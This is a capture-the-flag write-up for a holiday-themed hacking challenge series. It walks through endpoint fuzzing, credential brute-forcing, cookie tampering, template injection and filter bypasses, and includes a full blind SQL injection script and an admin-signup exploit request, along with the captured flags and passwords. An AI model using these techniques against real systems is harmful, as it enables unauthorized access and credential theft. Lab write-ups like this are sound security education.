After opening the `People Rater` app by clicking on the `Start Challenge` button, the first 5 people that the grinch does not like are already listed, luckily I did not find my name on that list, but who knows... 5 Additional entries can be loaded by clicking on the `Load More` button, but there seems to be a maximum of 16 entries on the list. In the background, requests are made to `/people-rater/page/<pagenumber>`, each page returns up to 5 JSON entries with ID and name, e.g. when requesting `/people-rater/page/1`, the following entries are returned: 

``` 
{"results":[{"id":"eyJpZCI6Mn0=","name":"Tea Avery"},{"id":"eyJpZCI6M30=","name":"Mihai Matthews"},{"id":"eyJpZCI6NH0=","name":"Ruth Ward"},{"id":"eyJpZCI6NX0=","name":"Calvin Hogan"},{"id":"eyJpZCI6Nn0=","name":"Reilly Cervantes"}]}
```

When clicking on an individual entry, an alert is shown with a rating of the person the grinch noted down. In the background, a `GET` request to `/people-rater/entry?id=<id>` is made, which e.g. returns the following result for the first entry:

```
{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
```

The `id` parameter looks like base64 encoded JSON. What immediately looked interesting was that decoding the ID of the first entry gave the following result:

```
$ echo eyJpZCI6Mn0= | base64 -d
{"id":2}
```

Let's try to get the entry with the ID 1:

```
$ echo -n '{"id":1}' | base64 -w0
eyJpZCI6MX0=
```

Issuing the following `GET` request returns an entry for the grinch. Of course, the grinch gave himself a good rating, it's hard to stay objective when talking about oneself, isn't it? But more importantly, flag 3, `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`, gets displayed as well:

{F1138930}

## Flag 4 - Swag Shop

**App description**: "Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop."

When visiting the swag shop site, 3 articles are displayed: one can buy an `I Hate Xmas Hoodie`, an `Xmas Sucks Cap` or a `Snow Ball Launcher`, obviously items the grinch himself would buy immediately. However, when clicking on the `Purchase` button below an item, a login promt gets displayed, it is not possible to buy anything if one does not have a swag shop account.

As there were no other options on the site, I took a look at the traffic in BurpSuite:

{F1138931}

Trying to purchase an item triggered requests to some endpoints under `/swagshop/api`: `login`, `purchase` and `stock`. Trying to manipulate the parameters did not give any useful results, therefore, I decided to fuzz the endpoints under `/swag-shop/api`. After using some small wordlists without success, finally, two additional endpoints were discovered:

```
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -mc all -fc 404 -t 4
[SNIP]
sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
:: Progress: [3132/3132] :: Job [1/1] :: 23 req/sec :: Duration: [0:02:13] :: Errors: 0 ::
```

The `sessions` endpoint looks interesting because it returned the status code 200 and quite a large response. Indeed, when issuing a `GET` request to `/swag-shop/api/sessions`, a list of sessions got returned!

```
{
  "sessions": [
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
    "eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
  ]
}
```

There is one entry standing out due to its length. When decoding this entry, we get a UUID and a cookie:

```
eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==

{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```

I lost some time because I tried to use the cookie directly as suggested by the JavaScript on the swag shop site:

```
$(".loginbtn").click(function(){
	$.post("/swag-shop/api/login",{
		username:$('input[name="username"]').val(),password:$('input[name="password"]').val()
	},function(o){
		document.cookie("token="+o.token),window.location="/swag-shop"
	}).fail(function(){
		alert("Login Failed")
	})
}
```

However, adding a cookie with the key `token` did not help, even when decoding the cookie and using the base64 decoded value:

```
$ echo NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY= | base64 -d
4548292f7d6624b1a42f74d11a48313860a5ada174b8daa735526c489046cbab67a1acd7b0fa987d9ed91d99ad5a6222ffc36c047899fb8f6c9e48ba2206ed16
```

This value is 128 characters long and therefore could be a hash, however googling and trying to crack the hash did not work either.

Finally, I remembered the challenge description: "Try and find a way to pull the Grinch's personal details from the online shop." Maybe there is a way to get personal details without logging in? I remembered that I found another endpoint, `/swag-shop/api/user` and that I got a user ID from the session identifier as well. 

The user endpoint returns `400 Bad Request` and the message `{"error":"Missing required fields"}` when being called without parameters. Another round of fuzzing with different wordlists finally revealed that the `uuid` parameter is required:

```
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=x -mc all -fr 'Missing required fields' -t 4
[snip]
uuid                    [Status: 404, Size: 40, Words: 5, Lines: 1]
:: Progress: [2588/2588] :: Job [1/1] :: 20 req/sec :: Duration: [0:02:08] :: Errors: 0 ::
```

The `404 Not Found` first made me think that this approach was another rabbit hole, but the message `{"error":"Could not find matching uuid"}` looked promising. Using the user ID as UUID finally gave me grinch's personal details together with the flag, `flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`:

{F1138932}

## Flag 5 - Secure Login

**App description**: "Try and find a way past the login page to get to the secret area."

When visiting `https://hackyholidays.h1ctf.com/secure-login`, a login form is shown and nothing else. When trying to login with random username and password, the error message `Invalid Username` gets returned. I tried to manipulate the username and password parameters, use SQLI payloads and test if special characters cause different error messages without success. As there was no other interesting content in the HTML source of the login page, I decided to bruteforce the username:
```
$ ffuf -X POST -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -u https://hackyholidays.h1ctf.com/secure-login -d 'username=FUZZ&password=asdf' -H 'Content-Type: application/x-www-form-urlencoded' -mc all -fr "Invalid Username"
[snip]
access                  [Status: 200, Size: 1724, Words: 464, Lines: 37]
:: Progress: [1000/1000] :: Job [1/1] :: 200 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Great - using `access` as username returns `Invalid Password` instead of `Invalid Username`. Maybe we can bruteforce the password as well?

```
$ ffuf -X POST -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -u https://hackyholidays.h1ctf.com/secure-login -d 'username=access&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -mc all -fr "Invalid Password"
[snip]
computer                [Status: 302, Size: 0, Words: 1, Lines: 1]
:: Progress: [1000/1000] :: Job [1/1] :: 200 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Great, seems like we got valid credentials!

Login with credentials `access:computer` succeeds, but `No Files To Download` gets displayed. Looks like there are some files to download, but not for us... 

{F1138933}

After searching for interesting stuff in the HTML source with no success, I decided to take a closer look at the authentication mechanism. The page uses cookie-based authentication. The cookie seems to be base64-encoded JSON because it starts with `eyJ` and ends with `%3D` (which is `=` when being URL-decoded). Decoding the cookie gives the following result:

```
$ echo eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0= | base64 -d
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```

When changing `"admin": false` to `"admin": true`, base64-encode, then URL-encoding the cookie and using the new cookie value instead, a download link gets displayed:

{F1138935}

After downloading the file and trying to open it, I noticed that the ZIP archive is encrypted. However, the password is simple enough to be crackable:

```
$ zip2john my_secure_files_not_for_you.zip > hash.txt
[snip]
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hahahaha         (my_secure_files_not_for_you.zip)
1g 0:00:00:00 DONE (2020-12-23 10:20) 100.0g/s 1228Kp/s 1228Kc/s 1228KC/s total90..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Unzipping the archive by using the password `hahahaha` was possible. The archive contains two files: `flag.txt` and `xxx.png`. While `xxx.png` seems to be a selfie of the grinch (not his best selfie by the way), `flag.txt` contains a flag:

```
$ cat flag.txt 
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
```

## Flag 6 - My Diary

**App description**: "Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?"

Visiting `https://hackyholidays.h1ctf.com/my-diary` redirects to `https://hackyholidays.h1ctf.com/my-diary/?template=entries.html` and shows the grinch's calendar. Obviously, `entries.html` is used as a template - let's try to directly access that file. Indeed, we can access `https://hackyholidays.h1ctf.com/my-diary/entries.html` directly, which means that we potentially have local file inclusion using the `template` parameter. Trying to access `/my-diary/index.php` causes a redirect as well, but accessing `/my-diary/index.html` causes a `404 Not Found` response, therefore, the application seems to be written in PHP. 

After overcomplicating things by trying to use PHP stream wrappers I finally found out that `index.php` can be included directly:

{F1138936}

Alright, getting redirected simply means that the target file was not found after removing every character that is not alphanumeric or a dot and also removing the substrings `admin.php` and `secretadmin.php`.

Trying to access `/my-diary/admin.php` directly results in `404 Not Found`, so maybe that file does not even exist. However, trying to access `/my-diary/secretadmin.php` looks more interesting as the error message `You cannot view this page from your IP Address` is returned.

This means that we probably need to bypass the filter mechanism. There seems to be no way around the character restriction. However, filtering the substrings `admin.php` and `secretadmin.php` is not done recursively but just once. Therefore, we can get the source of `secretadmin.php` wich contains the flag by crafting a filename that results in `secretadmin.php` after being filtered (`secretadmsecretadadmin.phpmin.phpin.php`):

{F1138937}

Unfortunately, the `Post` button does nothing (yet?), but hey, getting another flag is always great!


# Flag 7 - Hate Mail Generator

**App description**: "Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!"

The grinch does not get nicer when christmas gets closer, in contrary, he is obviously already grumpy enough to use a hate mail generator in order to speed up his hate mail workflow. 

There is one existing campaign with the following markup:

```
{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
```

Clicking on the `Preview` button shows the HTML mail. The variables used in the markup indicate that we might be able to use template injection for exploitation by creating new templates and previewing them, which is possible when clicking on the `Create New` button in the campaign overview.

When previewing newly generated templates, a `POST` request to `/hate-mail-generator/new/preview` is sent with the parameters `preview_markup` and `preview_data`. The content of the `Markup` field is submitted within the `preview_markup` parameter. Great, this looks like template injection will be possible indeed. However, the template variables that can be used seem to be restricted to the variables declared in the `preview_data` parameter and the `template:<filename>` variable we saw in the existing campaign.

Trying to insert an arbitrary template name by using `{{template:asdf}}` as `preview_markup` tells us that the template file is expected to be found under `/templates/<templatename>` due to the error message `Cannot find template file /templates/asdf`.

Trying to access `https://hackyholidays.h1ctf.com/hate-mail-generator/templates` seems to work, we can see that 3 files are present in this directory because directory listing is enabled:

{F1138939}

Unfortunately, we cannot access those files directly, the response is always 403 forbidden. It is possible to show the file content by inserting `{{template:<filename>}}` into a new hate mail and display the preview, but this only works for two out of those three files: when trying to display `38dhs_admins_only_header.html`, the error message `You do not have access to the file 38dhs_admins_only_header.html` gets shown in the response instead of the file content.

However, it is possible to bypass the restriction to display `38dhs_admins_only_header.html` via template markup because it is possible to add markup as value of a template variable in `preview_data`. When using the corresponding variable key inside `preview_markup`, first the key gets resolved to the corresponding value and afterwards the value gets resolved again, which means that in case a template is referenced, the content of the template file gets inserted into the preview. Therefore, when using the following values, it is possible to display `38dhs_admins_only_header.html` which contains the flag:

* `preview_markup`: `{{name}}`
* `preview_data`: `{"name":"{{template:38dhs_admins_only_header.html}}"}`

The response to such a request contains the flag, `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`:

{F1138940}

## Flag 8 - Forum

**App description**: "The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that!"

Well, I'm not surprised that nobody wants to talk to the grinch...

When visiting `https://hackyholidays.h1ctf.com/forum`, two forum section get displayed: the `General` section contains two categories, `Christmas!!!` and `Nice Things To Do`. Of course, `Nice Things To Do` does not contain any posts yet, the grinch does not do nice things anyway, but `Christmas!!!` contains one post with the title `Why I hate Christmas` which - surprise - is written by a user named `grinch`. `max` seems to be the only user that responded (and probably the only user that is registered as well...).

The `Admin` category cannot be viewed without being logged in as an admin, only the text `You need to be an admin to view these posts` gets displayed to unauthenticated users.

This challenge sent me into countless rabbit holes. Categories and posts are referenced by IDs in URL segments, so I first tried if IDOR works but gave up after the first 100 IDs gave no results. As there are two possible usernames, I tried to bruteforce their passwords with a small wordlist without result. Afterwards, I used `ffuf` to find additional paths. There seems to be a `phpmyadmin` installation accessible via `https://hackyholidays.h1ctf.com/forum/phpmyadmin`, but it seems to be just a mock because no other files that are typically present could be found there. Nevertheless, I researched popular CVEs that are easy to exploit but none of them worked of course (I did not expect to be successful with that approach anyway because it was not even possible to find out which version of phpmyadmin was mocked here).

Finally, after scrolling through the Discord channel, I found some hints that the source can be found in the Internet. Oh well, I totally did not expect that we need to use OSINT to proceed, but let's give it a try...

To my surprise, it was pretty easy to find the github repo with the `forum` sourcecode - the contribution activity of [adamtlangley](https://github.com/adamtlangley) showed that he committed to [Grinch-Networks/forum](https://github.com/Grinch-Networks/forum).

{F1138942}

Looking through the commit history (fortunately, there were only 4 commits), a commit named `small fix` struck my attention:

{F1138943}

The commit removed the credentials of a database user in `models/Db.php`:

```
self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
```

As phpmyadmin usually accepts database credentials, it was no big surprise that it is possible login to phpmyadmin with `forum:6HgeAZ0qC9T6CQIqJpD`.

The `forum` database is accessible, but we can only read the `user` table, when clicking on `comment`, `post` or `section`, only a message `Error reading database encoding...` was shown.

The `user` table contained the following entries:

```
id 	username 	password 	admin
1 	grinch 	35D652126CA1706B59DB02C93E0C9FBF 	1
2 	max 	388E015BC43980947FCE0E5DB16481D1
```

We need to be admin to read the entries in the admin section therefore we need to get grinch's plaintext password.

The password looks like MD5. Luckily I was lazy enough to first search if the hashes were already cracked by googling them. `max` hash gave me no result, but I found out that `BahHumbug` is the plaintext password of the user `grinch`. 

{F1138946}

Not even `rockyou.txt` contains the hash, it would have taken me forever to crack the hash on my own. Due to that, I'm still not sure if I missed a step that would have allowed to bypass the login by reviewing the `forum` sourcecode - looking shortly through it did not reveal any obvious bugs. On the other hand, if bruteforcing the password with a wordlist was possible, the `phpmyadmin` step could be bypassed altogether, maybe a hash that usually is not present in a common wordlist was used intentionally... 

Anyway, I successfully used `grinch:BahHumbug` to login to the forum and was able read the post in the admin area under the category `Secret Plans` which contains the flag, `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`:

{F1138947}

## Flag 9 - Evil Quiz

**App description**: "Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!"

The grinch wants us to take a quiz. In order to complete a quiz, one must specify a username and answer the following 3 questions:
* Do you like Christmas?
* Are you holly and jolly?
* Do you like presents?

After submitting the quiz, a score is printed and the number of other players with the same name gets shown.

After trying some input manipulation, I found out that the name input at the beginning of the quiz is vulnerable to SQL injection and we can see the result of a boolean query by analyzing the number of players displayed at the end of the game: when using `invalidplayername' or if(1=0, 1, 0); -- ` as username, zero players are selected from the database, therefore the count of other players equals zero, whereas when adding `invalidplayername' or if(1=0, 1, 0); -- `, all players are selected and the count is greater than zero.

Unfortunately, we need to submit multiple requests to get a result. Instead of trying to find out how to use SQLMap for that task / whether that is possible at all, I used the following Python script for getting the credentials:

```
import re
import requests
import string
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

RHOST = "https://hackyholidays.h1ctf.com"
# proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080" }
proxies = {}

def get_quiz(s):
    s.get(f"{RHOST}/evil-quiz")

def post_quiz(s, payload):
    data = { "name": payload }
    s.post(f"{RHOST}/evil-quiz", data=data)

def post_start(s):
    data = { "ques_1": 0, "ques_2": 0, "ques_3": 0 }
    res = s.post(f"{RHOST}/evil-quiz/start", data=data)
    m = re.search(".*There is ([0-9]+) other player\(s\) with the same name as you!.*", res.text, re.DOTALL)
    if m:
        return m.group(1)

def submit_try(s, payload):
    post_quiz(s, payload)
    return post_start(s)

def exploit(s, query):
    alphabet = string.printable
    resume = True
    result = ""
    position = 1
    while resume:
        resume = False
        for c in alphabet:
            candidate = ord(c)
            payload = f"sdfasdfgdsfgx' or substring(binary({query}), {position}, 1) = char({candidate}); -- "
            if int(submit_try(s, payload)) > 0:
                result += c
                print(f"[+] Found: {result}")
                position += 1
                resume = True
                break
    return result



if __name__ == "__main__":
    s = requests.Session()
    s.proxies.update(proxies)
    s.verify = False
    get_quiz(s)

    # initial pocs
    # print(submit_try(s, "sdfasdfgdsfg' or if(1=1, 1, 0); -- "))
    # print(submit_try(s, "sdfasdfgdsfg' or if(1=0, 1, 0); -- "))

    # there is only 1 table schema of interest -> schema name: quiz
    # print(submit_try(s, "sdfasdfgdsfg' or (select count(schema_name) from information_schema.schemata where schema_name <> 'information_schema') = 1; -- "))
    # result = exploit(s, "select schema_name from information_schema.schemata where schema_name <> 'information_schema'")
    # print(result)

    # there are 2 tables in schema quiz: admin, quiz
    # print(submit_try(s, "sdfasdfgdsfg' or (select count(table_name) from information_schema.tables where table_schema = 'quiz') = 2; -- "))
    # result = exploit(s, "select table_name from information_schema.tables where table_schema = 'quiz' limit 1")
    # result = exploit(s, "select table_name from information_schema.tables where table_schema = 'quiz' limit 1 offset 1")

    # there are 3 columns in table admin: id, password, username
    # print(submit_try(s, "sdfasdfgdsfg' or (select count(column_name) from information_schema.columns where table_schema = 'quiz' and table_name = 'admin') = 3; -- "))
    # result = exploit(s, "select column_name from information_schema.columns where table_schema = 'quiz' and table_name = 'admin' limit 1")
    # result = exploit(s, "select column_name from information_schema.columns where table_schema = 'quiz' and table_name = 'admin' limit 1 offset 1")
    # result = exploit(s, "select column_name from information_schema.columns where table_schema = 'quiz' and table_name = 'admin' limit 1 offset 2")

    # there is 1 entry in table admin: id: 1, username: admin, password: S3creT_p4ssw0rd-$
    # print(submit_try(s, "sdfasdfgdsfg' or (select count(*) from admin) = 1; -- "))
    print(submit_try(s, "sdfasdfgdsfg' or (select id from admin) = 1; -- "))
    result = exploit(s, "select username from admin")
    print("Username: " + result)
    result = exploit(s, "select password from admin")
    print("Password: " + result)
```

After getting the credentials (which took quite a while), I was able to login with `admin:S3creT_p4ssw0rd-$` and get the flag, `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`:

{F1138948}

## Flag 10 - Signup Manager

**App description**: "You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!"

When visiting `https://hackyholidays.h1ctf.com/signup-manager` and looking through the HTML source, there is a reference to `README.md`: 

```
<!-- See README.md for assistance -->
```

README.md can be found under `https://hackyholidays.h1ctf.com/signup-manager` and tells us default credentials (`admin:password`) that do not work and that a zip archive named `signupmanager.zip` must be unzipped in order to deploy the application.

```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

Luckily, someone forgot to remove the zip archive from the server after unpacking it, therefore we can download it from `https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip`. The zip archive contains the sourcecode of signup manager page. The logic seems to happen in `index.php`.

Of course, `https://hackyholidays.h1ctf.com/signup-manager/users.txt` was not found. According to the README, the `users.txt` was probably placed into an inaccessible directory.

To further analyze the behaviour of the application, I unpacked the zip archive and started a local PHP development server from the directory containing hte unpacked files with `php -S 0.0.0.0:8000`.

Signing up at my local test server e.g. causes the following line to be written into `users.txt`:

```
myusername#####34819d7beeabb9260a5c854bc85b3e444e6fce8107c28f716a911683586ccf6d18#MyFirstName####MyLastName#####N
```
 
A user entry equals a line of 112 chars in that file plus Y at the end if it is an admin user, else N. When signing up for an account, N is appended at the end, therefore, all users added via signup are non-admins. 

According to the source code, each field has a certain length. If a string submitted by the user is shorter, the value is padded with `#` using the `pad_str` function.

By looking at the source code again, I noticed that additional characters are stripped from a line immediately before it is written to `users.txt`:

```
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
```

This means that if we somehow manage to construct a string that is at least 1 character longer than expected, we can create a valid entry for an admin user by placing `Y` at position 113, e.g. by using the `lastname` parameter where we can freely choose the content as long as it is alphanumeric and exactly 15 characters long. 

Fortunately, `str_pad` does not strip strings longer than the expected length but instead keeps the whole string. This means we need to find a field where we can insert a string that is longer than expected.

The parameters `username`, `firstname` and `lastname` have a minimum length of 3 characters and are filtered through `substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["<VALUE>"]), 0, 15)` before being padded, this makes using multibytes to cause inconsistencies in the string length impossible. The `password` parameter is stored as md5 value and therefore has a fixed length, however, no check is being performed before passing the `POST` parameter form user input into `password = md5($_POST["password"])`. When using an array instead of a string, signing up succeeds with a PHP warning (`PHP Warning:  md5() expects parameter 1 to be string, array given in /[SNIP]/index.php on line 76`) but no password hash is added to the final entry in `users.txt` because the `md5()` function just returns an empty string. Unfortunately, a shorter string in `users.txt` does not help because it gets filtered out when getting a list of users from `users.txt` during login, only entries with exactly 113 characters are considered valid.

This only leaves the `age` parameter for bypassing the length. The `age` parameter is checked as follows before passing it to `add_user`:

```
if (!is_numeric($_POST["age"])) {
	$errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
	$errors[] = 'Age entered is too long';
}
$age = intval($_POST["age"]);
if (count($errors) === 0) {
	$cookie = addUser($username, $password, $age, $firstname, $lastname);
```

The `is_numeric` check assures that `age` is numeric, which rules out multibyte attacks again. However, it is not only possible to enter decimal values, `is_numeric` also accepts other representation of numbers.

After some trial and error, I found out that there is an inconsistency regarding the length in `strlen()` vs `intval()` when using numbers in scientific notation: `intval(1e3)` equals `1000` which is of length 4, but `strlen(1e3)` is 3:

```
$ php -A
php > $x = "1e3"; echo is_numeric($x) . " " . strlen($x) . " " . intval($x) . " " . str_pad(intval($x), 3, "#");
1 3 1000 1000
```

This allows us to make the user entry 1 character longer than expected. The final `N` is cut off before adding this entry to `users.txt`, therefore an admin user can be created by adding `Y` as the very last character of the line which is the last character of a 15 character long `lastname` parameter.

The following request creates an admin user:

```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Connection: close

action=signup&username=lumi&password=nougatzzz&age=1e3&firstname=lumi&lastname=AAAAAAAAAAAAAAY
```

When logging in with `lumi:nougatzzz`, admin.php gets included in the page which contains the flag, `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`, as well as a link to the 11th challenge:

{F1138949}


## Flag 11 - Recon Server

Using the link from the 10th challenge, it is possible to access the recon server challenge under `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59`.

{F1138950}

What struck my attention first were the requests that load images, e.g.:

```
GET /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9 HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
```

When base64 decoding the `data` parameter, one can see that it contains a JSON object (as expected when looking at the first few characters of the base64 string):

```
{"image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg","auth":"e934f4407a9df9fd272cdb9c397f673f"}
```

I immediately thought of some sort of SSRF / local file inclusion but the content of the `image` parameter was protected by the `auth` value, which looks like a hash. When changing the `image` parameter to something else, the error message `invalid authentication hash` gets returned. After trying to crack the hash I came to the conclusion that it is possibly server-generated.

Next, I tried to find the API which was mentioned on the challenge site. It was pretty straightforward to find the API's base URL under `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api`:

{F1138951}

